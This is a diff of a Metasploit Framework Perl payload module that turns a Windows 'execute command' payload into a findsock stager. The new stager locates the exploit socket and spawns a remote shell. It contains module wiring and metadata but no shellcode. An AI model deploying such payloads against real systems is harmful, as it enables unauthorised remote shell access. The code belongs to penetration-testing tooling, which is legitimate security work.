@@ -7,26 +7,22 @@
 # version of the Framework can always be obtained from metasploit.com.
 ##
 
-package Msf::Payload::win32_exec;
+package Msf::Payload::win32_findrecv_ord_stg;
 
 use strict;
-use base 'Msf::PayloadComponent::Windows::ia32::ExecuteCommand';
+use base 'Msf::PayloadComponent::Windows::ia32::PipedShellStage';
 
 my $info =
 {
-	'Name'         => 'Windows Execute Command',
-	'Version'      => '$Revision$',
-	'Description'  => 'Execute an arbitrary command',
-	'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
-	'UserOpts'     =>
-		{
-			'CMD' => [1, 'DATA', 'The command string to execute'],
-		},
+  'Name'         => 'Windows Recv Tag Findsock Shell',
+  'Version'      => '$Revision$',
+  'Description'  => 'Finds the exploit socket and spawns a shell',
+  'Authors'      => [ 'skape <mmiller [at] hick.org>', ],
 };
 
 sub _Load 
 {
-	Msf::PayloadComponent::Windows::ia32::ExecuteCommand->_Import('Msf::PayloadComponent::NoConnection');
+	Msf::PayloadComponent::Windows::ia32::PipedShellStage->_Import('Msf::PayloadComponent::Windows::ia32::FindRecvOrdinalStager');
 
 	__PACKAGE__->SUPER::_Load();
 }
@@ -43,16 +39,6 @@ sub new
 	$self = $class->SUPER::new($hash, @_);
 
 	return($self);
-}
-
-#
-# Return the user specified command to execute
-#
-sub CommandString 
-{
-	my $self = shift;
-
-	return $self->GetVar('CMD');
 }
 
 1;
